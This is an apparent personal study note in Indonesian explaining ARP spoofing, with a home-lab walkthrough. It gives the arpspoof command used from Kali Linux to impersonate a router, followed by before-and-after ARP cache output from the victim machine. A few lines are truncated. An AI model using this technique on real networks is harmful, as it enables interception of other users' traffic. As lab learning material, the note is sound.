---
id: Arp Spoofing
aliases: []
tags: []
---

## Apa itu ARP Spoofing

- ARP atau Address Resolution Protocol adalah sebuah protokol untuk menemukan mac address dari suatu alamat IP di jaringan LAN kita
- ARP Spoofing adalah teknik menipu komputer lain dimana kita menyamar sebagai IP Address lain, dan mac address lain

## Cara melakukan ARP Spoofing

- Misi: Kali linux akan menipu ubuntu, dengan menyamar sebagai si router `172.16.1.1`

### Kali linux

1. Buka terminal
2. Cek
3. Contoh saya akan menyamar menjadi IP 172.16.1.1, dan ingin menipu(target): 172.16.1.101
4. Command: `sudo arpspoof -i eth0 -t 172.16.1.101 172.16.1.1 -r`

### Ubuntu

1. Buka terminal
2. Coba cek arp cache sebelum di spoofing

   ```bash
   kali@VirtualBox:~$ arp -n
   Address                  HWtype  HWaddress           Flags Mask            Iface
   172.16.1.103             ether   08:00:27:6e:13:6e   C                     enp0s3
   172.16.1.1               ether   08:00:27:1e:e1:b8   C                     enp0s3
   ```

   - Lalu kali linux memiliki IP akhiran `103` dan mac `6e`
   - Bisa dilihat bahwa untuk router `172.16.1.1` memiliki mac address dengan ahkhiran `b8`

3. Setelah spoofing dilakukan
   ```bash
   kyouma@kyouma-VirtualBox:~$ arp -n
   Address                  HWtype  HWaddress           Flags Mask            Iface
   172.16.1.103             ether   08:00:27:6e:13:6e   C                     enp0s3
   172.16.1.1               ether   08:00:27:6e:13:6e   C                     enp0s3
   ```
   - Bisa dilihat ip kali linux tetap `103`, dan mac `6e`, tapi mac router berubah
   - Router memiliki IP benar yaitu `172.16.1.
   - Kesimpulanya: kali linux menyamar sebagai router, dengan IP `172.16.1.1`
